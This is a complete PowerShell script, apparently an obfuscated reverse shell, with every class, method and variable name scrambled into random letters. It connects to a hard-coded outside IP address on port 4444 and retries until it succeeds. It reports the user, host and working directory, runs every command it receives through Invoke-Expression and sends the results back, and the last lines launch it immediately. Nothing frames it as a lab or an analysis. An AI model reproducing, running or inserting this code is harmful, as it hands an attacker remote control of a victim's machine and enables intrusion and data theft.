class nZGiFFEmMahwVtvfaF {
    
    [string]$PunVVrGVPlT = "93.49.240.195"
    [int]$DrTEhInfRhUeePbeTmmDV = 4444

    $ZrzAiHPByxjCLzPchPdG
    $PcfVqrrVUPsBQPihG
    $vGfaTCRjXpKLnFBJHeXysBiV
    $tbbdyIlNrMZL
    $GclEVMO
    $qhmAEiomiYiyqH
    [int]$ZyGrobGeOfzgDVtYzMOvGrrW = 50*1024

    bdfvTsQPQVqFKB() {
        $this.PcfVqrrVUPsBQPihG = $false
        while ($true) {
            try {
                $this.PcfVqrrVUPsBQPihG = New-Object Net.Sockets.TcpClient($this.PunVVrGVPlT, $this.DrTEhInfRhUeePbeTmmDV)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.jXsNixwXND()
    }

    jXsNixwXND() {
        $this.ZrzAiHPByxjCLzPchPdG = $this.PcfVqrrVUPsBQPihG.GetStream()
        $this.tbbdyIlNrMZL = New-Object Byte[] $this.ZyGrobGeOfzgDVtYzMOvGrrW
        $this.qhmAEiomiYiyqH = New-Object Text.UTF8Encoding
        $this.vGfaTCRjXpKLnFBJHeXysBiV = New-Object IO.StreamWriter($this.ZrzAiHPByxjCLzPchPdG, [Text.Encoding]::UTF8, $this.ZyGrobGeOfzgDVtYzMOvGrrW)
        $this.GclEVMO = New-Object System.IO.StreamReader($this.ZrzAiHPByxjCLzPchPdG)
        $this.vGfaTCRjXpKLnFBJHeXysBiV.AutoFlush = $true
    }

    UPNniFeGyIlCBDaWTjhKAcDg() {
        $this.bdfvTsQPQVqFKB()
        $this.QwtBbTEyrOdnODq()
    }

    qVOoUoENpmOehPnHgtLSNFf($zyZzRRdbWMfFvOTaPJvyN) {
        try {
            [byte[]]$bvBYzkNWGOwHgRLHUa = [text.Encoding]::Ascii.GetBytes($zyZzRRdbWMfFvOTaPJvyN)
            $this.vGfaTCRjXpKLnFBJHeXysBiV.Write($bvBYzkNWGOwHgRLHUa, 0, $bvBYzkNWGOwHgRLHUa.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.UPNniFeGyIlCBDaWTjhKAcDg()
        }
    }

    [string] LLTNLgycCdczT() {
        try {
            $czmptUgACzcBUbEzimLQhtQD = $this.ZrzAiHPByxjCLzPchPdG.Read($this.tbbdyIlNrMZL, 0, $this.ZyGrobGeOfzgDVtYzMOvGrrW)    
            $fcRdThbklFZthxf = ($this.qhmAEiomiYiyqH.GetString($this.tbbdyIlNrMZL, 0, $czmptUgACzcBUbEzimLQhtQD))
            return $fcRdThbklFZthxf
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.UPNniFeGyIlCBDaWTjhKAcDg()
            return ""
        }
    }

    [string] xfcldLcnZmUsKLWkQqnWUle($rgTyxPFIpenS) {
        Write-Host $rgTyxPFIpenS
        try { 
            $OJoEZTcKRvVgY = Invoke-Expression $rgTyxPFIpenS | Out-String
        }
        catch {
            $FXraLyzXuXIdLFhTg = $_.Exception
            $niOsRTyBBIDlOdY = $_.Message
            $OJoEZTcKRvVgY = "`n$_`n"
        }
        return $OJoEZTcKRvVgY
    }

    [string] dKKRQyH() {
        $UUJXKC = [Environment]::UserName
        $twSpMjSrMMQCCaWgNqacs = [System.Net.Dns]::GetHostName()
        $AOwwKorhVZ = Get-Location
        return "$UUJXKC@$twSpMjSrMMQCCaWgNqacs [$AOwwKorhVZ]~$ "
    }

    QwtBbTEyrOdnODq() {
        while ($this.PcfVqrrVUPsBQPihG.Connected) {
            $this.qVOoUoENpmOehPnHgtLSNFf($this.dKKRQyH())         
            $fcRdThbklFZthxf = $this.LLTNLgycCdczT()
            $OJoEZTcKRvVgY = "`n"
            if ([string]::IsNullOrEmpty($fcRdThbklFZthxf)) {
                continue
            }
            $OJoEZTcKRvVgY = $this.xfcldLcnZmUsKLWkQqnWUle($fcRdThbklFZthxf)
            $this.qVOoUoENpmOehPnHgtLSNFf($OJoEZTcKRvVgY + "`n")
            $this.ZrzAiHPByxjCLzPchPdG.Flush()
        }
        $this.PcfVqrrVUPsBQPihG.Close()
        $this.UPNniFeGyIlCBDaWTjhKAcDg()
    } 
}

$PZKbwOqtCzEQEvTL = [nZGiFFEmMahwVtvfaF]::new()
$PZKbwOqtCzEQEvTL.UPNniFeGyIlCBDaWTjhKAcDg()
